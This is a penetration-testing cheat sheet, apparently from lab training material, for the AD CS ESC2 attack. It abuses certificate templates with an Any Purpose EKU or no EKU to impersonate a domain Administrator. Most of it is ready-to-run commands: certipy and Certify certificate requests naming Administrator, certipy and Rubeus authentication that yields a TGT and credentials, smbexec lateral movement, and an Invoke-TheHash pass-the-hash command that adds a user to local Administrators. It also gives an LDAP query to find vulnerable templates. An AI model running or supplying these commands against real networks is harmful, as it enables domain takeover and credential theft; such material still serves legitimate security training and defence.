# 13.05 ESC2 Any Purpose Template

> Templates with Any-Purpose EKU (`2.5.29.37.0`) or no EKU work for client auth — exploit identically to ESC1 if SAN is suppliable.

## Overview

Certificate templates with Any Purpose EKU (OID 2.5.29.37.0) or no EKU set can be used for any purpose including client authentication. If the template also allows supplying a SAN, the attack is identical to ESC1. From Windows, Certify.exe uses the same command syntax as ESC1.

## Steps

- Identify via certipy: Any Purpose: True or Extended Key Usage: Any Purpose
- If Enrollee Supplies Subject is also true, exploit identically to ESC1 with -upn or /altname
- After obtaining certificate, authenticate via certipy auth or Rubeus asktgt
- Use TGT with smbexec.py or Invoke-TheHash for lateral movement
- PowerShell enumeration filter differs: checks for OID 2.5.29.37.0 or no EKU

## Commands

### certipy req ESC2

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC2 -upn Administrator
```

### certipy auth

```bash
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip <TARGET>
```

### smbexec with TGT

```bash
KRB5CCNAME=administrator.ccache smbexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

### Certify.exe ESC2 request

```powershell
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC2 /altname:Administrator
```

### OpenSSL convert

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### Rubeus asktgt

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

### Invoke-TheHash PTH add admin

```powershell
Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators grace /add"
```

### PowerShell ESC2 template query

```powershell
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```
